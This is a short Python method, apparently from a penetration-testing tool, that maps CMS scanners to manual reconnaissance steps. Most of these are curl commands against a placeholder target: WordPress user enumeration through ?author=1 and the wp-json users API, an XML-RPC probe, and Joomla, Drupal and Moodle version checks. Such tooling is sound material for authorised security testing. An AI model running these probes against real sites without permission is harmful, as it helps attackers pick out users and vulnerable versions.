    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Get manual alternatives for CMS enumeration tasks"""
        alternatives = {
            'wpscan': [
                'Manual user enum: curl http://target/?author=1',
                'Check wp-json API: curl http://target/wp-json/wp/v2/users',
                'XML-RPC check: curl -X POST http://target/xmlrpc.php',
                'View page source for WordPress version in meta tags'
            ],
            'droopescan': [
                'Manual Joomla version: curl http://target/administrator/manifests/files/joomla.xml',
                'Manual Drupal version: curl http://target/CHANGELOG.txt',
                'Check robots.txt for CMS paths',
                'Enumerate nodes: curl http://target/node/1'
            ],
            'moodlescan': [
                'Manual Moodle check: curl http://target/README.txt',
                'Check version in page source',
                'Try admin login: http://target/login/',
                'Research Moodle CVEs: https://snyk.io/vuln/composer:moodle%2Fmoodle'
            ]
        }

        for key, cmds in alternatives.items():
            if key in task_id:
                return cmds

        return []
